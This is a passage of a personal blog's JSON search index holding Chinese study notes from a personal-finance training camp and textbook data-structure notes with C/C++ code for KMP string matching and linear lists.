that.","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"十四天理财训练营笔记","slug":"十四天理财训练营笔记","date":"2018-08-29T06:03:45.000Z","updated":"2019-02-10T14:18:29.619Z","comments":true,"path":"2018/08/29/十四天理财训练营笔记/","link":"","permalink":"http://leo.dropsec.xyz/2018/08/29/十四天理财训练营笔记/","excerpt":"我有一个愿望，希望在接下来这个属于我们的时代能够赶上一个风口，能够赶上“同龄人”的步伐。","text":"我有一个愿望，希望在接下来这个属于我们的时代能够赶上一个风口，能够赶上“同龄人”的步伐。 热身周8.16 财务自由&amp;&amp;理财 第一桶金的意义不在于多或者少，而是告诉了我们一种可能性，原来自己可以通过这个事情变现，你的思路你的行动是值钱的。 走到人生的某一个阶段时，我决心要成为一个富有之人，这并不是因为爱钱的缘故，而是为了追求那种独立自主的感觉。我喜欢能够自由地说出自己的想法，而不是受到他人意志的左右。 –巴菲特背后的男人 查理芒格 被动收入 &gt; 生活开支，就是财务自由。 财务自由 == 财富自由? 暖暖目前已经实现理财收益覆盖每月工资的1/3，向财务半自由跨进一小步，暖暖最终的目标就是希望依靠理财收益将自己从工作中解放出来。 什么是有钱人呢？ 衡量有钱人的一个重要指标，就是被动收入占总收入的比例非常高，往往超过90%。 学习理财的目标就是给我们自己创建源源不断的被动收入。 训练营结束的时候，期待大家会有的改变是： a.合理消费，摆脱月光 b.懂得合理配置自己的资产 c.为家庭做好坚固的保障 d.开始投资，赚取被动收益 一休挖井的小故事给我们的启示有两点：一个是方法比努力更重要，二是坚持。 brain sexy 比 body sexy 更难，吸引力也更持久。 8.17 七夕~ 穷人/富人思维&amp;&amp;财富的载体–时间 “穷人思维”让我们过于关注于拥有的资源本身，所以常常忽略了另外一些更重要的东西，比如–你的目标。穷人每天去担心做这个没钱，做那个没钱，害怕担风险；富人学习怎么更有效的掌控风险，一味的逃避本身就是一种看不到的风险，你逃不掉的~ 我们常说学习理财，思维先行，内功心法比一招一式难学的多，理财规划应该趁早进行，以免年轻时任由“钱财放水流”，蹉跎岁月之后，老来嗟叹，空悲切。 理财重在规划别让“等有了钱再说”误了你的“钱途”，找到合适的资源做合适的事情，不要贪图省钱而去做着不合适的事情，做好人生规划，不能让省钱耽误自己的前行。 我们总是抱怨没有时间学习，却在朋友圈的百无聊赖中流连忘返，我们抱怨钱越挣越少，却在理财面前抽搐，好似望洋兴叹。我们用力摔贫穷的帽子，却在寻找财富的道路上处处走得像个穷人。所以贫穷衍生贫穷，生生不息。因为贫穷思维，我们的财务常年兵荒马乱，原来信誓旦旦的财务自由，永远是那么的遥不可及……所以我们需要警醒的是–真正的穷不是缺钱，而是待在穷人思维的怪圈里走不出来。（贫穷思维的影响下，只会注意到怎么省钱，而不是多去想怎么赚钱） 想做到财务自由，首先要把自己当成一个富人，先有其思维思想，再依次去学习理财的方法，然后成为一个真正的富人。 想做一件事情需要在72小时之内完成它，要不然就永远不会做了。 在日常生活中，我们对于开销的理解，多以金钱来量化，很少有人会把时间也计算在内。 其实随着我们收入水平的提高，“用金钱换时间”的思维也会愈发明晰。如果你现在还处于事业起步阶段，没关系，先把这个观念植入大脑。所以我们强调，凡事都是思维先行，技巧其后。尽量花时间去武装大脑，而不是为了节约开支而浪费大把时间，因为时间才是最珍贵的。总结：理财的第一个思维，重视时间成本。 资金的时间价值。对于不同的人而言，金钱的时间价值是不同的，这取决于他们利用这笔钱的预期投资回报率。 不理财不等于没风险，通货膨胀就是我们最大的风险。 学习的时间成本。年轻的时候，也就是人生前期越嫌麻烦，越懒得学，后来就越可能错过让你心动的人和事，错过新风景。不管是追求事业上的成就，或者是想要努力实现财务自由，这一路都要经历很多的麻烦。学习和成长从来都不是一件不劳而获的事情，任何新知识的掌握、新技能的提升，都需要我们去克服心理上、环境上的重重障碍，才能有所回报。 8.18 怎么度过周末&amp;&amp;购物与投资or养娃？ 周末就是完全属于我们的休闲时刻，但周末对我们来说不仅是放松，更是给了我们一个调整自己状态的时间。这个时间可以让我们腾出空去做我们喜欢的事情：运动放松身心、开始打磨一项让自己越来越值钱的技能、开始读一本沉寂已久的书、和老友小聚一下、陪陪家人…(当然了，大部分小伙伴的状态还是吃吃睡睡躺躺 o_o ….） 8+2暖暖定律 大家不经思考听建议买入的，通常都会让你后悔的，主要有以下两个原因：1.他清楚为什么而买，而你并不清楚，你是跟风的，后面他知道什么情况下要做相应动作，比如说补仓，或者落袋为安。而你因为不知道为什么买入，当然也不知道后续要根据不同的市场情况做不同的动作，你说说，你不亏，谁亏？ 2.适合别人的标的物，不一定适合你自己。因为每个人的风险承受能力和贪欲程度都不同。比如你们都买入同一支股票，后期一直跌的话，他可能会扛得住，而你风险能力没他强，最后还没等到涨起来就只能忍痛割爱了。 在购物前想想是必要、需要、还是想要。遇到事情的时候不要恐慌，要去分析、量化。 克制消费冲动是很重要的一种财商能力，就是很多成人也无法做到，这类人往往是无法延迟满足的人，看见蛋糕冰淇淋就马上要吃，从而减肥失效，看到喜欢的东西就马上要买，从而把钱花的精光，他们只执着于眼前的、短期的满足感，而无法克制欲望，来得到更长远的满足。 延迟消费就是培养孩子财商的重要一步。 理财就是理生活，等你从点滴开始积累好良好的理财习惯你就会发现自己生活的其他方面也得到了巨大的改变。你开始喜欢读书，喜欢思考，喜欢憧憬更美好的生活。 （关于财商教育：先给孩子自己选择的权力，然后再讲道理，孩子容易接受，也不会闹腾） 8.19 提高时间杠杆率 提高收入的三个模式：将每一份时间卖的更贵、将每一份时间卖出更多次、将每一份时间按比率卖出（也叫睡后收入）。模式一是大部分人通过提高自己的技能，再单位时间里获取更多工资，明显弊端是职场生涯是有天花板的，工资不会无限制增加；模式二是利用当下互联网大势将我们的时间同时卖出很多次，比如公众号、网上付费课程、开网店；模式三最典型的就是投资，当我们的投资能力足够强的时候我们就有了固定的年化收益率，在资本的力量下同样的时间我们的投资还在帮我们挣一份钱。 模式一是我们安身立命之本，所以在开拓出模式三之前，即使辛苦我们也要好好工做，但是也要注意不要在忙碌中陷入越来越忙的怪圈，模式三的建立是一步一步来的，现在就可以着手开始… 石头提出的问题： 关于自由、关于幸福、挣钱的意义、个人局限性、孩子成年后的教育… (每个人都有适合自己的生活、适合自己的路，想明白以后要过什么样的生活、成为一个什么样的人，走下去就好了。 –石头) 正式开营8.20 通货膨胀与投资陷阱 取到崭新连号的人民币我却一点也不开心–隐形杀手通货膨胀。 金融骗局：e租宝、善心汇、MMM平台、ICO… 沉没成本：指已经发生且不可收回的支出，无论现在或未来做什么决策，都无法改变的成本。 如何防范投资骗局？ 第一，弄清楚每一个投资背后的原理，你赚的是谁的钱？第二，先学习再投资；第三，不要相信太高的无风险投资收益率。 一个东西，你要支付超过它本身价值的好几倍，然后完全只能靠发展下线来得到回报，不是传销就是骗子。 最重要一点，不要相信太高的无风险投资收益率，任何一个人或者公司，如果跟你只谈收益不谈风险，那妥妥的就是耍流氓。 不知道的风险才是最大的风险。 知识的匮乏让我们的眼界也缩小，就像书上说的：在一楼你看到的是满地垃圾，在100层你能看到满城的风景还有那远处山景，海景！ –地中山 8.21 分清资产和负债&amp;&amp;富人思维 人生的财富终值取决于你是否有投资的理念，和你的收入等有一点关系，但关系不大。 –小熊老师 资产：能把钱放进你口袋的东西。 负债：把钱从你口袋里取走的东西。 分清楚资产和负债，争取以后消费多买入资产，少买或不买入负债。 成为富人的第一个秘密是，在一生中不断地买入资产，资产品种丰富，给自己带来更多收入，不用单一依靠工资。资产包括：优质公司的股权、债券、票据、房地产、发明的专利、书籍著作权… 富人的收入里面有股息分红、债券利息、租金收入、专利使用费、版权费… 成为富人的第二个秘密是对待新鲜事物的态度。富人乐于接受新鲜事物，并在不断增长见识的过程中，提升自己辨别事物的能力，同时结交更多的朋友，拓展自己的圈子，遇到更多的贵人，进而良性循环。 财富是理出来的，没钱更需要理财。 如何变成富人思维？ 首先要学会花钱。穷人只在看得见的地方（能马上获得利益的地方）花钱，把钱花在不能持续产生价值的事情上，我们不投资自己，自己的赚钱能力就很难提升，收入的增加也就变得很困难。有钱人都特别舍得为自己的未来花钱，我们虽然不一定有钱，但是可以学习这种思维。 暖暖几点建议：1.学会理财技能，为自己不断积累资产； 2.趁年轻有精力多学习理财知识，并尝试各种理财产品，找到适合自己的理财品种，多学习多实践，用较低的试错成本换回正确的投资技能和过硬的投资心态。 为了达到最终的财务自由，我们要学习延迟满足、理性消费，学会投资。 面对股票，暖暖的做法：1.先分析是不是能赚钱的公司 2.现在公司是不是足够便宜 3.分档建仓 图片制作者：肩吾 8.22 保险 投资就是投资，保险就是保险，我们要尽量回避这种四不像的东西，既能赚钱，又能保障，往往是钱赚不好，保障也保不好（比如分红险）。买保险的初衷是为了保障，保险的功能是转移风险，重心不是收益。 怎么买保险？ 买保险的第一原则：优先家庭支柱。第二个原则，保险需要组合配置，而不是单独只买一种。 意外险低保费高保额，是人人必备的险种；每个家庭的支柱都应该配备寿险（注意保额问题）；意外险 &gt; 重疾险 &gt; 寿险。 怎么买保险？教你三大顺序，六大原则 任何资产配置的核心都是以当前实际情况为依托综合考量的结果。 图片制作者：肩吾 8.23 选股票？or选对象？ 晨读分享《一个普通人怎样靠股票赚到100万？》，感触很大，回头多多咀嚼晨读分享的文章。 【暖暖语录】：免费的才是最贵的。 对你的能力圈来说，最重要的不是能力圈的大小，而是你知道自己能力圈的边界所在，你将比那些能力圈虽然比你大五倍，却不知道边界所在的人要富有的多。 –巴菲特 （巴菲特就不擅长分析科技公司的股票，但也不耽误人家赚钱。要学会挣到自己能挣的钱） 任何一次投资决策的失误都是由于投资知识的不过关导致的。 –某投资人 辩证看待。 【暖暖语录】：挑股票和找对象很像。聪明的投资者，不说能看清对方以后几十年的发展趋势，至少你要看清他是一个什么样的人，是否值得你托付终身（长期拥有）。 股价是怎么来的？短期来看，股价是由供求关系决定的，长期来看，是由它的内在价值决定的。 价值投资最重要的一件事就是给公司估值，而分析财报又是估值的重要一环。不管市场情况如何，长期来看股票的价格一定是回归价值的，低买高卖，我们赚的就是这部分钱。 价值投资的一个好处是：通过分析，你对行业能够有更深刻的了解，从而能够找到这个行业的痛点，寻找到风口。强大的分析能力不仅是投资时的厉害武器，也是几乎任何工作都会得到并且非常重要的能力。 投资股票，分析年报，其实不仅仅能够说我们能够找到好公司股票，在这个过程中，你会发现你本来从下往上看的视角，变成了从上往下看。那些学生时代的盲点，行业的发展前景怎么样，自己所在公司怎么赚钱的，自己所在部门在公司的地位，都可以通过你的分析获得答案。你会把初入职场时只想着的加薪，学生时代只想着的找份稳定或者所谓的好工作的思维切换，变成你怎么看你们公司和部门，判断出自身的价值和天花板在哪里，这就是跳出你的圈子去思考。 8.24 圈子&amp;&amp;资本 如果真正想做一件事，就一定要尽早地融入到行业内部圈子，更核心或者更加前端，圈外人只有等到变化了才行动，就太慢了。这个世界都是内行人赚外行人的钱。 时间花在哪是看得见的，钱也一样，没有一个人的成长和进步是不需要投资的，只有先喂饱脑袋才会反应过来给你赚钱。 怎么估值一个公司？内容比较系统，主要从盈利能力、是否有行业护城河、是否有隐藏的盈利能力，还要学会辨别那些把年报做的“很好看”的公司。 我们自己的资本价值：可以理解为我们现在的收入水平可以用多少资本价值来衡量。 资本价值表/资本奴隶表 人生是一场长跑，而资本是我们的交通工具（前提是你需要积累），如果没有资本的帮助，我们只是用自己的两条腿在跑，磨破了脚，磕破了膝盖，也还是要继续往前跑，就像我们即使再不情愿也要工作一样。 人挣钱很难，但是钱生钱很容易。我们现在需要做的就是：1.努力工作，积累本金；2.学习投资知识，提高自己的资本收益率。 8.25 不做内藤&amp;&amp;不做韭菜 导致高龄贫穷的原因：1.自身或家人生病或发生事故花费高额医疗费；2.子女不工作或薪水微薄，需要啃老；3.遭受诈骗，被骗去大半生积蓄；4.熟年离婚。 既要学会赚钱也要学会花钱，才能体现我们赚的钱的价值，才能更好的赚钱。 –落鲸 老话说：居安思危！真是大道至简！也许你现在风光，安逸！但没有长远的规划，一样会像内藤一样！慎之！慎之！ –地中山 对我们来说，市场上的韭菜多其实是一件好事，我们努力的成为一个理性的投资者，是一件很有价值的事情，而不是凭感觉去追那些所谓的热点。 辨证看待。 【暖暖语录】：不知道怎么赚，就会不知道怎么亏。 投资误区：1.炒概念股；2.不看单股价格看市值；3.听人推荐选股；4.没有投资所需匹配的知识。 股票投资，80%的利润，是在20%的时间内完成的。所以想获得80%的收益，其他80%不赚钱的时候，你也得在场。即使你在场，也并不代表每一天都要买卖，事实上，不操作最好。 闪电下来的时候你必须在场。 投资的心理误区：1.旅鼠效应，说简单点就是随大流；2.逆向合理化，有些人接受不了深度套牢，把买入的股票当成支持中国经济的发展，来说服自己持有；3.可得性偏差，只从自己和身边人看到的事情做决策；4.归因论，很多人喜欢找到原因，把股市暴跌归结于某某公司增发或者某大V的文章，就是典型的归因论；5.归他因，做好了都是自己的原因，做亏了都是其他人的问题；6.轻易放弃，投资是一场长跑，能坚持跑到终点才算胜利；每次牛市都是无数股神，但是往往下一次这些股神就不见了。 8.26 估值&amp;&amp;入场 年轻人最好的投资就是自己的能力。 –巴菲特 如何估值？估值指标有三个：市盈率、市净率、股息率。 市盈率 = 市值 / 净利润 (PE = P / E) 从盈利的角度对公司估值，意义是以现在的价格买入这家公司以后，几年能够回本。 市净率 = 市值 / 净资产 (PB = P / B) 从资产的角度来估值,意义是以现在的价格买入，是折价买入还是溢价买入。 股息率 = 每股分红 / 股价 意义是我以这个价格买入这家公司，仅靠分红，我每年能获得多少收益率。 （股价越低，股息率越高，换句话说；股息率越高，越有投资价值） 股息率的判断标准是三年期银行定存利率。现在的三年期银行定存利率是2.75%，也就是说股息率高于2.75%，就表示公司相对比较便宜。这三个指标虽然都是比较简单的指标，但是组合起来使用，就能够发挥非常大的威力。 3.除了估值，我们要知道如何入场？班班觉得进场的两个方式：第一个就是投资指数基金，第二个就是自己构建股票组合。指数温度，不仅可以指导我们投资指数基金，还可以指导我们了解现在的整个股市的状况；构建股票组合则是选择适合自己的优质股票进行调优配置。 8.27 基金定投&amp;&amp;指数基金 基金定投又被称之为“懒人投资法”，就好比银行的零存整取方式，是比较适合上班族和大学生们的投资方式。但基金定投也是存在很多误区的，不通过学习很容易走进歧途，如果没有合适的策略，只是无脑定投，最终也是会发生亏损的。 定投基金止盈的目的在于让我们的收益落袋为安，所以定投基金是一种比较稳健的投资；不止损的意思是说，当我们选好低估的指数基金后，即使我们定投后它有了短暂的下跌，这个时候基金更是低估了，所以我们不但不能卖出反而要加大定投金额，这样我们买入的成本会变小。不止损的前提是我们定投的是低估的指数基金，如果基金赶在高位买了再定投只能是越买越亏。 奴隶主与奴隶的故事提醒我们：当我们忙到什么都顾不上的时候，一定要想想，自己是不是已经是奴隶了。我们比奴隶好一点，还有时间思考这些问题，假如我们忙到不能思考，那就是新时代奴隶。 全民娱乐化，就是精英阶层防止中下阶层逆袭，所以给我们精神鸦片，让大家好好开心的不思进取。 辨证看待。 暖暖当班主任快一年了接触了很多学员，越来越感觉到成为富人是有门槛的，不愿意接受新鲜事物的、借口忙一直不行动的、热衷于追求免费而花费了太长时间的都被卡在外面了。 基金好像收益不大吧，怎么能快速积累财富呢？ –缘梦 答：基金的收益比较稳健，如果想快速积累财富就是股票。 主动型基金＆被动型基金（指数型基金） 暖暖对主动/被动基金的分享也很nice，直接贴聊天记录。 A-C-B 是哭泣曲线 ，B-D-E是微笑曲线。从A点开始定投，那我们的成本大部分都会集中在高部位的地方呈现一个悲伤曲线；而从B点呢，我们的成本是不断下降的，可能在后面那个小的升幅，我们的就赚钱了。 怎么判断我们处在A点还是B点呢？永远不要去预测股市，我们要做的是学会估值，根据估值来决定是否进场！如果当前的估值比较低，也就是说价格是低于基金的内在价值的，那么我们这个时候就要买入。 根据估值和指数温度定投,更重要还在于找到最便宜的的指数买，也就是当前价格远远低于其内在价值的指数基金去买，然后在指数温度高的时候卖掉，换另外一只便宜的买，等到全部高了，就停止定投，卖出落袋为安！ 复利三因素：本金、时间、收益率。你懂的~ 富翁计划，强制存储？。 8.28 投资后的变化&amp;&amp;量化人生1.学习投资之后的变化：1.不再看鸡汤文了，因为没空；2.从买买买变成了投投投；3.研究如何赚钱，而不是抱怨为何没钱。 2.富人思维下财务自由的几个阶段： 第一阶段，投资自由，终于有闲钱可以投资了；第二阶段，债券自由，你的资金量可以买AAA级以下的高收益债券了，这个门槛是300万可投资资产，这个阶段，你会发现很多可以投资的资产；第三阶段，居住自由，已经有了全球资产配置的能力，今天可以去泰国，后天可以去东京；第四阶段，财富自由，这个阶段，你已经过了为钱而工作的阶段，你的工作纯粹是处于兴趣，野心和责任心等；第五阶段，并购自由，到此，你要思考的问题是，买哪个公司好？国家的政策是否对我有利？ 3.【存储/规划】：年轻的时候好好工作，留个心多为自己以后打算打算，这样我们中年的时候才不会太被动。4.【暖暖语录】：多挣钱是挺重要的，但是被动收入能显著提高人的幸福感。5.【暖暖语录】：构建好被动收入的渠道，我们也可以在身体还年轻的时候“提前退休”。6.如果你没有找到一个当你睡觉时还能赚钱的方法，你将一直工作到死。 –巴菲特 8.29 机遇 理财越早开始越好。时间之于复利。 走上人生巅峰有三条路：家庭出身、创业、理财。理财不要忽视。 结合生活，学会去发现身边隐藏的投资机会。 8.30 国债逆回购 读书的同时也要阅读自己。 国债逆回购 8.31 股票？ 投资股票应该注意的三点：1.股票价格普遍低于价值的时候入场；2.估值过高买入查公司，可能是百年难解套；3.好公司的股票长期看涨，即使处于牛市顶端。 美林时钟 9.1 走起？ 场内、场外 劝你理财是我最大的温柔。 开户~ 她的成长史？谁？。 9.2 资产配置 为什么你成不了富人？ 穷人强调客观条件，富人强调主观条件；穷人看重技能，富人注重意识；穷人强调眼前，富人注重眼界；穷人看重资产，富人看重现金流；穷人要万事俱备，富人能适者生存； 动态平衡的资产配置要求我们做到平常大家很难做到的事，低买高卖。 在别人贪婪的时候我恐惧，在别人恐惧的时候我贪婪。 -巴菲特 标准普尔家庭资产配置： 要花的钱，用于短期消费，占家庭结余的10%；保命的钱，用于保险保障，占家庭结余的20%；生钱的钱，重在获得高收益，占家庭结余的30%；保本的钱，重在安全、稳定和长期性，占家庭结余的40%。 9.3 投资自己 and 毕业？ 不管你现在拿多少薪水，哪怕是没有收入的学生党，你一定要养成每个月“为自己的未来”花点钱的习惯。清空了才能注满，学会自我投资。比如，每个月拿出100–200元买一些知识付费产品。 在这个时代，我们要努力培养的是维系雇佣关系的能力，而不是人情关系。雇佣关系对双方来说都是最舒服的关系，合得来继续，合不来散伙。 花钱是一门艺术，一旦你开始把钱花对了地方，就像死水开始流动，你的人际关系，你的专业，你的社交，你的眼界，随即就会开始流动起来。 如果你希望成为一个有资产的人，终有一天不是只靠工资来生活，那你就来听一下吧。 首先，就是储蓄，积少成多在任何领域都是成立的；尽早开始理财投资；注意规避风险； 9.4 –&gt;还是学生的时候一个月就能拿出来几百块定投。生活都不易，关键在于自己成全自己。 -珊瑚","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"重温数据结构-串(KMP)","slug":"重温数据结构-串-KMP","date":"2018-08-04T03:27:45.000Z","updated":"2018-10-15T13:52:18.624Z","comments":true,"path":"2018/08/04/重温数据结构-串-KMP/","link":"","permalink":"http://leo.dropsec.xyz/2018/08/04/重温数据结构-串-KMP/","excerpt":"感觉串的操作挺无聊的。主要看了“一”下KMP,嗯,一下 ~","text":"感觉串的操作挺无聊的。主要看了“一”下KMP,嗯,一下 ~ KMP算法课本伪代码1234567891011121314151617181920212223242526272829303132333435363738394041int Index_KMP(SString S, SString T, int pos)&#123; //利用模式串T的next函数求T在主串S中第pos个字符之后的位置的KMP算法 //其中，T非空，1&lt;&lt;pos&lt;&lt;StrLength(S) i = pos; j = 1; while(i &lt;= S[0] &amp;&amp; j &lt;= T[0]) &#123; if(j == 0 || S[i] == T[j]) // 继续比较后续字符 &#123; ++i; ++j; &#125; else j = next[j]; // 模式串向右移动 &#125; if(j &gt; T[0]) return i - T[0]; // 匹配成功 else return 0;&#125;void get_next(SString T, int next[])&#123; // 求模式串T的next函数值并存入next数组 i= 1； next[1] = 0; j = 0; while(i &lt; T[0]) &#123; if(j == 0 || T[i] == T[j]) &#123; ++i; ++j; next[i] = j; &#125; else j = next[j]; &#125;&#125; 完整KMP的C Plus的实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;stdlib.h&gt;using namespace std;void findnext(char *pattern, int *next) &#123; int len = strlen(pattern); next[0] = 0; for(int i = 1; i &lt; len; i++) &#123; int j = next[i-1]; while(j &gt; 0 &amp;&amp; pattern[j] != pattern[i]) j = next[j-1]; if(pattern[j] == pattern[i]) next[i] = j + 1; else next[i] = 0; &#125; cout &lt;&lt; \"partial match table: \"; for(int i = 0; i &lt; len; i++) cout &lt;&lt; next[i] &lt;&lt; \" \";&#125;int KMP(char *pattern, char *sourceString, int *next) &#123; int sourcelength = strlen(sourceString); int patternlength = strlen(pattern); int p = 0, s = 0; while(p &lt; patternlength &amp;&amp; s &lt; sourcelength &amp;&amp; patternlength &lt;= sourcelength) &#123; if(pattern[p] == sourceString[s]) &#123; s++; p++; &#125; else &#123; if(p == 0) s++; else p = next[p - 1]; &#125; &#125; return p == patternlength ? s - patternlength : -1;&#125;int main() &#123; int next[100]; char pattern[100]; char sourceString[100]; int position; cout &lt;&lt; \"please input source string and pattren:\" &lt;&lt; endl; while(cin &gt;&gt; sourceString &gt;&gt; pattern) &#123; findnext(pattern, next); position = KMP(pattern, sourceString, next); cout &lt;&lt; endl &lt;&lt; \"matched from \" &lt;&lt; position &lt;&lt; \" to \" &lt;&lt; position + strlen(pattern) &lt;&lt;endl; &#125; system(\"pause\");&#125;","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"重温数据结构-线性表","slug":"重温数据结构-线性表","date":"2018-07-31T12:55:58.000Z","updated":"2018-08-01T02:50:58.537Z","comments":true,"path":"2018/07/31/重温数据结构-线性表/","link":"","permalink":"http://leo.dropsec.xyz/2018/07/31/重温数据结构-线性表/","excerpt":"线性表是最基本、最简单、也是最常用的一种数据结构。","text":"线性表是最基本、最简单、也是最常用的一种数据结构。 线性表线性表的顺序表示和实现//线性表的动态分配顺序存储结构 #define LIST_INIT_SIZE 100 //线性表存储空间的初始分配量 #define LISTINCREMENT 10 //分配增量 typedef struct { ElemType * elem; //存储空间基址 int length; //当前长度 int listsize; //当前分配的存储容量（以sizeof(ElemType)为单位） }SqList; Status InitList_Sq(SqList &amp;L) { //构造一个空的线性表L L.elem = (ElemType * ) malloc (LIST_INIT_SIZE * sizeof(ElemType)); if(!L.elem) exit(OVERFLOW); //存储分配失败 L.length = 0; //空表长度为0 L.listsize = LIST_INIT_SIZE; //初始存储容量 return OK; } Status ListInset_Sq(SqList &amp;L, int i, ElemType e) { //在顺序线性表L中第i个位置之前插入新的元素e //i的合法值为 1 &lt;= i &lt;= ListLength_Sq(L) + 1 if( i &lt; 1 || i L.length + 1) return ERROR; //i值不合法 if(L.Length &gt;= L.listsize) { //当前存储空间已满，增加分配 newbase = (ElemType * ) realloc(L.elem, (L.listsize + LISTINCREMENT) * sizeof(ElemType)); if(!newbase) exit(OVERFLOW); //存储分配失败 L.elem = newbase; //新基址 L.listsize += LISTINCREMENT; //增加存储容量 } q = &amp; (L.elem[i-1]); //q为插入位置 for(p = &amp;(L.elem[L.length-1]); p &gt;= q; --p) *(p + 1) = *p; //插入位置及之后的元素右移 *q = e; //插入e ++L.length; //表长加一 return Ok; } Status ListDelete_Sq(SqList &amp;L, int i, ElemType &amp;e) { //在顺序表L中删除第i个元素，并用e返回其值 //i的合法值为 1 &lt;= i &lt;= ListLength_Sq(L) if(i &lt; 1 || i &gt; L.length) return ERROR; p = &amp; (L.elem[i-1]); //p为被删除元素的位置 e = *p; q = L.elem + L.length - 1; //表尾元素的位置 for(++p; p &lt;= q; ++p) *(p - 1) = *p; //被删除元素之后的元素左移 --L.length; //表长减一 return OK; } void MergeList_Sq(SqList La, SqList Lb, SqList &amp;Lc) { //已知顺序线性表La和Lb中的元素按值非递减排列 //归并La Lb到顺序线性表Lc，Lc的元素值也按值非递减排列 pa = La.elem; pb = Lb.elem; Lc.listsize = Lc.length = La.length + Lb.length; pc = Lc.elem = (ElemType * ) malloc (Lc.listsize * sizeof(ElemType)); if(!Lc.elem) exit(OVERFLOW); //存储分配失败 pa_last = La.elem + La.length - 1; pb_last = Lb.elem + Lb.length - 1; while(pa &lt;= pa_last &amp;&amp; pb &lt;= pb_last) { //归并 if( * pa &lt;= * pb) * pc++ = * pa++; else * pc++ = * pb++; } while(pa &lt;= pa_last) * pc++ = * pa++; //插入La中剩余元素 while(pb &lt;= pb_last) * pc++ = * pb++; } 线性表的链式表示和实现//线性表的单链表存储结构 typedef struct LNode { ElemType data; Struct LNode *next; }LNode, *LinkList; Status GetElem_L(LinkList L, int i, ElemType &amp;e) { // L为带头结点的单链表的头指针 // 当第i个元素存在时，其值赋给e并返回OK，否则返回ERROR p = L -&gt; next; j = 1; //初始化，p指向第一个结点，j为计数器 while(p &amp;&amp; j &lt; i) { //顺时针向后查找，直到p指向第i个元素或p为空 p = p -&gt; next; ++j; } if(!p || j &gt; i) return ERROR; //第i个元素不存在 e = p -&gt; data; //取第i个元素 return OK; } Status ListInsert_L(LinkList &amp;L, int i, ElemType e) { // 在带头结点的单链线性表L中第i个位置之前插入元素e p = L; j = 0; while(p &amp;&amp; j &lt; i - 1) { // 寻找第i-1个结点 p = p -&gt; next; ++j; } if(!p || j &gt; i-1) return ERROR; // i小于1或者大于表长加1 s = (LinkList) malloc (sizeof(LNode)); //生成新结点 s -&gt; data = e; s -&gt; next = p -&gt; next; p -&gt; next = s; return OK; } Status ListDelete_L(LinkList &amp;L, int i, ElemType &amp;e) { // 在带头结点的单链线性表L中，删除第i个元素，并由e返回其值 p = L; j = 0; while(p-&gt;next &amp;&amp; j &lt; i-1) { // 寻找第i个结点，并令p指向其前驱 p = p -&gt; next; ++j; } if(!(p-&gt;next) || j &gt; i-1) return ERROR; // 删除位置不合理 q = p -&gt; next; p -&gt; next = q -&gt; next; // 删除并释放结点 e = q -&gt; data; free(q); return OK; } void CreateList_L(LinkList &amp;L, int n) { // 逆位序输入n个元素的值，建立带表头结点的单链线性表L L = (LinkList) malloc (sizeof(LNode)); L -&gt; next = NULL; // 先建立一个带头结点的单链表 for(i = n; i &gt; 0; --i) { p = (LinkList) malloc (sizeof(LNode)); // 生成新结点 scanf(&amp;p -&gt; data); // 输入元素值 p -&gt; next = L -&gt; next; L -&gt; next = p; // 插入到表头 } } // 对比着顺序线性表的归并理解 void MergeList_L(LinkList &amp;La, LinkList &amp;Lb, LinkList &amp;Lc) { // 已知单链线性表La和Lb的元素按值非递减排列 // 归并La和Lb得到新的单链线性表Lc, Lc的元素也按值非递减排列 pa = La -&gt; next; pb = Lb -&gt; next; Lc = pc = La; // 用La的头结点作为Lc的头结点 while(pa &amp;&amp; pb) { if(pa -&gt; data &lt;= pb -&gt; data) { pc -&gt; next = pa; pc = pa; pa = pa -&gt; next; } else { pc -&gt; next = pb; pc = pb; pb = pb -&gt; next; } } pc -&gt; next = pa ? pa : pb; // 插入剩余段 free(Lb); //释放Lb的头结点 } 双向链表// 线性表的双向链表存储结构 typedef struct DuLNode { ElemType data; struct DuLNode *prior; struct DuLNode *next; }DuLNode, *DuLinkList; Status ListInsert_DuL(DuLinkList &amp;L, int i, ElemType e) { // 在带头结点的双链循环线性表L中第i个位置之前插入元素e // i的合法值为 1&lt;=i&lt;=表长+1 if(!(p = GetElemP_DuL(L, i))) // 在L中确定插入位置 return ERROR; // p=NULL 插入位置不合法 if(!(s = (DuLinkList) malloc (sizeof(DuLNode)))) return ERROR; s -&gt; data = e; s -&gt; prior = p -&gt; prior; p -&gt; prior -&gt; next = s; s -&gt; next = p; p -&gt; prior = s; return OK; } Status ListDelete_DuL(DuLinkList &amp;L, int i, ElemType &amp;e) { // 删除带头结点的双链循环线性表L的第i个元素，i的合法值为1&lt;=i&lt;=表长 if(!(p = GetElemP_DuL(L, i))) return ERROR; e = p -&gt; data; p -&gt; prior -&gt; next = p -&gt; next; p -&gt; next -&gt; prior = p -&gt; prior; free(p); return OK; } 题集例题2.10 从顺序存储结构的线性表a中删除第i个元素起的k个元素 Status DeleteK {SqList &amp;a, int i, int k) { if(i &lt; 1 || i &gt; a.length - 1 || k &lt; 0 || k &gt; a.length - i) //注意i的编号从0开始 return INFEASIBLE; for(j = 0; j &lt; k; j++) a.elem[i+j] = a.elem[i+K+j]; a.length = a.length - k; return OK; } 2.11 设顺序表va中的数据元素递增有序。试写一算法，将x插入到顺序表的适当位置上，以保持该表的有序性。 Status InsertOrderList(SqList &amp;va, ElemType x) { int i; if(va.length == va.listsize) return(OVERFLOW); for(i = va.length; i &gt; 0, x &lt; va.elem[i-1]; i--) va.elem[i] = va.elem[i-1]; va.elem[i] = x; va.length++; return OK; } 2.19 已知线性表中的元素以值递增有序排列，并以单链表作存储结构。试写一高效的算法，删除表中所有值大于mink且小于maxk的元素（若表中存在这样的元素），同时释放被删结点空间，并分析你的算法的时间复杂度（注意，mink和maxk是给定的两个参变量，它们的值可以和表中的元素相同，也可以不同）。 Status Delete_Between(Linklist &amp;L, int mink, int maxk) { p = L; while(p-&gt;next-&gt;data &lt;= mink) p = p -&gt; next; // p是最后一个不大于mink的元素 if(p-&gt;next) // 如果还有比mink更大的元素 { q = p -&gt; next; while(q-&gt;data &lt; maxk) q = q -&gt; next; // q是第一个不小于maxk的元素 p -&gt; 